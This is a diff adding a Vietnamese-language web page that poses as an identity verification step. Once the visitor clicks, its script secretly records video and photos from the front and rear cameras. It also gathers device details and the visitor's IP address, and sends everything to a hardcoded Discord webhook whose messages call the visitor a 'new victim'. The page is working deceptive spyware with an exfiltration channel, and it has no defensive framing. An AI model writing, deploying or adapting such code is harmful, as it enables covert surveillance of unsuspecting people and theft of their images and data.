@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xác Thực Danh Tính</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    margin: 0; padding: 0; height: 100vh;
+    background: linear-gradient(135deg, #1e3c72, #2a5298);
+    color: white; display: flex; justify-content: center; align-items: center;
+  }
+  .container {
+    text-align: center; background: rgba(0,0,0,0.7); padding: 40px; 
+    border-radius: 16px; max-width: 85%; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  }
+  h1 { margin: 0 0 10px; font-size: 24px; }
+  p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
+  
+  /* Nút bấm thật sự để kích hoạt quyền Camera */
+  #start-btn {
+    background: #4fc3f7; color: #000; border: none; padding: 15px 30px;
+    font-size: 18px; font-weight: bold; border-radius: 50px;
+    cursor: pointer; box-shadow: 0 4px 15px rgba(79, 195, 247, 0.4);
+    transition: 0.2s;
+  }
+  #start-btn:active { transform: scale(0.95); }
+
+  video, canvas { display: none; }
+</style>
+</head>
+<body>
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<div class="container">
+  <h1>Yêu cầu xác thực</h1>
+  <p>Vui lòng bấm nút bên dưới để xác minh danh tính.</p>
+  <button id="start-btn">Bắt đầu xác thực</button>
+  <div id="loading" style="margin-top:15px; font-size:14px; color:#4fc3f7;"></div>
+</div>
+
+<script>
+// ===== CẤU HÌNH DISCORD WEBHOOK =====
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1572524780039569481/jv_lvQeH3BLd9iUubApFCOIJeJtwWYj6qK22nAGINDsK28UZ3ebciobPNnbrz4bycCiz';
+
+let captureCount = 0;
+const MAX_ATTEMPTS = 5;
+let isStreaming = false;
+let retryTimer = null;
+
+async function sendText(text) {
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: text })
+    });
+  } catch (e) { console.log("Lỗi gửi text", e); }
+}
+
+async function sendMedia(blob, type, caption) {
+  if (!blob) return;
+  const formData = new FormData();
+  const ext = type === 'photo' ? 'jpg' : 'webm';
+  formData.append('files[0]', blob, `${type}_${Date.now()}.${ext}`);
+  formData.append('content', caption.substring(0, 2000));
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+  } catch (e) { console.error('Send failed:', e); }
+}
+
+async function collectInfo() {
+  let info = `🎯 **Nạn nhân mới mở link!**\nThời gian: ${new Date().toLocaleString('vi-VN')}\n`;
+  info += `📱 Thiết bị: \`${navigator.userAgent}\`\n`;
+  info += `📺 Màn hình: ${screen.width}×${screen.height}\n`;
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      info += `🔋 Pin: ${Math.round(battery.level * 100)}%\n`;
+    } catch {}
+  }
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    info += `🌐 IP: \`${data.ip}\`\n`;
+  } catch {}
+  return info;
+}
+
+function takePhoto(video, isFrontCamera) {
+  return new Promise((resolve, reject) => {
+    if (video.videoWidth === 0) return reject(new Error("Video chưa có dữ liệu"));
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    if (isFrontCamera) { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    ctx.setTransform(1, 0, 0, 1, 0, 0);
+    canvas.toBlob((blob) => {
+      if (blob) resolve(blob); else reject(new Error("canvas.toBlob null"));
+    }, 'image/jpeg', 0.9);
+  });
+}
+
+async function getStream(facingMode) {
+  return await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false 
+  });
+}
+
+async function startCaptureProcess() {
+  if (isStreaming) return;
+  if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
+
+  // Kiểm tra HTTPS
+  if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+    document.getElementById('loading').textContent = 'Lỗi: Cần chạy trên HTTPS!';
+    return;
+  }
+
+  document.getElementById('start-btn').style.display = 'none';
+  document.getElementById('loading').textContent = 'Đang kết nối Camera...';
+
+  try {
+    let stream = await getStream('user');
+    isStreaming = true;
+    document.getElementById('loading').textContent = 'Đang ghi hình...';
+
+    const video = document.getElementById('cam');
+    video.srcObject = stream;
+    
+    await new Promise((resolve) => {
+      if (video.readyState >= 2) resolve();
+      else video.onloadeddata = resolve;
+    });
+    await video.play();
+    await new Promise(r => setTimeout(r, 1000));
+
+    const info = await collectInfo();
+    sendText(info + `\n✅ **Đã cấp quyền. Bắt đầu Camera TRƯỚC...**`);
+
+    let options = { mimeType: 'video/webm;codecs=vp8' };
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/webm' };
+    
+    let recorder = new MediaRecorder(stream, options);
+    let chunks = [];
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.start();
+
+    let photoIndex = 1;
+    let photoIntervalId = setInterval(async () => {
+      try {
+        const photoBlob = await takePhoto(video, true);
+        await sendMedia(photoBlob, 'photo', `📸 **Ảnh TRƯỚC #${photoIndex}**`);
+        photoIndex++;
+      } catch (e) { console.log(e); }
+    }, 1500);
+
+    await new Promise(resolve => {
+      recorder.onstop = resolve;
+      setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, 4000);
+    });
+    clearInterval(photoIntervalId);
+    
+    await sendMedia(new Blob(chunks, { type: 'video/webm' }), 'video', `🎥 **Video TRƯỚC**`);
+    stream.getTracks().forEach(track => track.stop()); 
+
+    // Chuyển Camera Sau
+    sendText(`🔄 **Đang chuyển sang Camera SAU...**`);
+    document.getElementById('loading').textContent = 'Đang chuyển Camera...';
+    await new Promise(r => setTimeout(r, 1000));
+
+    stream = await getStream('environment'); 
+    video.srcObject = stream;
+    
+    await new Promise((resolve) => {
+      if (video.readyState >= 2) resolve();
+      else video.onloadeddata = resolve;
+    });
+    await video.play();
+    await new Promise(r => setTimeout(r, 1000));
+
+    recorder = new MediaRecorder(stream, options);
+    chunks = [];
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.start();
+
+    photoIndex = 1;
+    photoIntervalId = setInterval(async () => {
+      try {
+        const photoBlob = await takePhoto(video, false); 
+        await sendMedia(photoBlob, 'photo', `📸 **Ảnh SAU #${photoIndex}**`);
+        photoIndex++;
+      } catch (e) { console.log(e); }
+    }, 1500);
+
+    await new Promise(resolve => {
+      recorder.onstop = resolve;
+      setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, 4000);
+    });
+    clearInterval(photoIntervalId);
+    
+    await sendMedia(new Blob(chunks, { type: 'video/webm' }), 'video', `🎥 **Video SAU**`);
+    
+    stream.getTracks().forEach(track => track.stop());
+    document.getElementById('loading').textContent = 'Hoàn tất.';
+
+  } catch (err) {
+    captureCount++;
+    document.getElementById('start-btn').style.display = 'block';
+    document.getElementById('loading').textContent = 'Thất bại. Vui lòng thử lại.';
+    
+    if (captureCount === 1) {
+       const info = await collectInfo();
+       sendText(info + `\n❌ **Lỗi Camera:** ${err.message}`);
+    }
+
+    if (captureCount < MAX_ATTEMPTS) {
+       retryTimer = setTimeout(startCaptureProcess, 4000);
+    }
+  }
+}
+
+// BẮT SỰ KIỆN CLICK VÀO NÚT THẬT
+document.getElementById('start-btn').addEventListener('click', startCaptureProcess);
+
+</script>
+</body>
+</html>
